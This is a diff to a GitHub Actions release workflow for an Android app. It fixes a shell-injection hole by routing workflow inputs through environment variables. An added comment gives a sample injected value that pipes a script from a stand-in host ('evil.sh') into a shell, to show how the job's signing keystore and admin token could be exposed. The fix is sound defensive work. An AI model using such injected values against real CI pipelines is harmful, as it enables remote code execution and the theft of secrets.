@@ -95,13 +95,18 @@ jobs:
         env:
           NEXT_PUBLIC_API_URL: ${{ secrets.NEXT_PUBLIC_API_URL }}
           ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN }}
+          # Inputs go through the environment, never straight into the script
+          # text: "${{ inputs.* }}" is substituted BEFORE the shell parses it,
+          # so a value like  x"; curl evil.sh | sh; "  would run with this
+          # job's signing keystore and admin token in scope.
+          INPUT_VERSION_NAME: ${{ inputs.version_name }}
+          INPUT_NOTES: ${{ inputs.notes }}
         run: |
           APK_PATH="android/app/build/outputs/apk/direct/release/app-direct-release.apk"
-          NOTES="${{ inputs.notes }}"
-          if [ -n "$NOTES" ]; then
-            node scripts/release-apk.mjs "${{ inputs.version_name }}" "$APK_PATH" "$NOTES"
+          if [ -n "$INPUT_NOTES" ]; then
+            node scripts/release-apk.mjs "$INPUT_VERSION_NAME" "$APK_PATH" "$INPUT_NOTES"
           else
-            node scripts/release-apk.mjs "${{ inputs.version_name }}" "$APK_PATH"
+            node scripts/release-apk.mjs "$INPUT_VERSION_NAME" "$APK_PATH"
           fi
 
       - name: Upload APK as workflow artifact
